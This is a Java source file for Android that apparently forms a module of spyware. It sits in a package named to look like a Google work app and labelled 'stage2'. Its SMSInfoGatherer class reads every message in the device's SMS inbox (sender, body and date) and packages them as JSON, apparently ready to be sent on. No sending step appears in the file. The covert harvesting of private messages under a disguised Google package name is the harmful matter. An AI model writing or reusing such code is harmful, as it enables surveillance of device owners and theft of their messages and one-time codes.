package com.google.android.apps.work.stage2;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class SMSInfoGatherer {

    public static String getAllSms(Context context) {
        JSONArray jsonArray = new JSONArray();
        ContentResolver contentResolver = context.getContentResolver();
        
        try (Cursor cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address", "body", "date"},
                null,
                null,
                "date DESC")) {

            if (cursor != null) {
                int addressIndex = cursor.getColumnIndex("address");
                int bodyIndex = cursor.getColumnIndex("body");
                int dateIndex = cursor.getColumnIndex("date");

                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(addressIndex));
                    sms.put("body", cursor.getString(bodyIndex));
                    sms.put("date", cursor.getLong(dateIndex));
                    jsonArray.put(sms);
                }
            }
        } catch (Exception e) {
            Log.e("SMSInfoGatherer", "Error gathering SMS", e);
        }
        
        return jsonArray.toString();
    }
}
